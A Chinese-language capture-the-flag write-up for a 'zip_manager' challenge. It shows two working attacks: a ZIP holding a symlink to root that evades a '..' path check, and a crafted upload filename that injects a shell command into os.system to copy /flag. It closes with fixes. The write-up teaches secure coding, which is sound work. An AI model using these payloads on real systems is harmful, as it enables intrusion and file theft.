# zip_manager

## 题目简述

题目允许上传 ZIP 并浏览解压后的文件。下载路由只拦截路径中的 `..`，但会跟随符号链接；上传路由又把用户可控文件名直接拼进 `os.system('unzip ...')`。因此既可以用 ZIP 中的绝对路径符号链接越出用户目录，也可以通过文件名命令注入读取 `/flag`。

## 解题过程

### 1. 符号链接绕过路径检查

服务端使用系统 `unzip` 解压，而后续文件浏览逻辑通过 `os.path.isdir()`、`os.path.isfile()` 和 `send_file()` 访问目标。这些 API 默认都会跟随符号链接。下载路由的黑名单逻辑等价于：

```python
def is_blocked(subpath):
    if ".." in subpath:
        return True
    return False
```

在 Linux 上创建指向根目录的符号链接，并让 `zip` 保留链接本身：

```bash
ln -s / root
zip -y symlink.zip root
```

上传 `symlink.zip` 后，文件会解压到用户目录下的 `symlink/root`，其中 `root` 仍指向 `/`。浏览 `/symlink/root/` 时路径中没有 `..`，但服务端实际列出的已经是容器根目录：

```text
bin/  boot/  dev/  etc/  home/  lib/  media/  ...
```

继续访问 `/symlink/root/flag` 即可由 `send_file()` 返回 flag。

### 2. 文件名命令注入

另一处漏洞位于上传后的解压命令：

```python
zip_path = os.path.join(user_dir, f.filename)
dest_path = os.path.join(user_dir, f.filename[:-4])
f.save(zip_path)

os.system('unzip -o {} -d {}'.format(zip_path, dest_path))
```

程序只要求文件名以 `.zip` 结尾，没有用参数数组调用子进程，也没有对路径加 shell 引号。可以在抓包工具中修改 multipart 的 `filename`，用分号插入命令，再用 `#` 注释原命令的剩余部分。

文件名本身若包含 `/`，会在 `f.save()` 阶段被当成目录分隔符。为避免这一点，可用 `printf` 的八进制转义在 shell 执行时再生成斜杠。首页会显示 `./uploads/<hash>`，将其中的 `<hash>` 代入：

```text
a.zip;cp $(printf '\057flag') $(printf '.\057uploads\057<hash>\057flag.txt');#.zip
```

该文件名满足 `.endswith('.zip')`，并且在 Linux 文件系统中不含真正的 `/`。传入 `os.system()` 后，两个 `printf` 分别生成 `/flag` 与 `./uploads/<hash>/flag.txt`，实际执行的是：

```bash
cp /flag ./uploads/<hash>/flag.txt
```

即使前面的 `unzip` 因文件内容无效而失败，分号后的 `cp` 仍会运行。之后访问 `/flag.txt` 即可读取结果，不需要把 flag 外传到第三方服务器：

```text
0xGame{2fc76ab2-aa2f-441d-9143-210150fabce9}
```

## 方法总结

本题有两条独立利用链：ZIP 保留的符号链接让文件浏览越界，未加引号的 shell 命令则造成文件名注入。修复时应拒绝 ZIP 中的符号链接并校验每个解压目标的规范化路径仍位于用户目录；同时用 `subprocess.run([...], shell=False)` 或安全解压库替代字符串拼接的 `os.system()`。
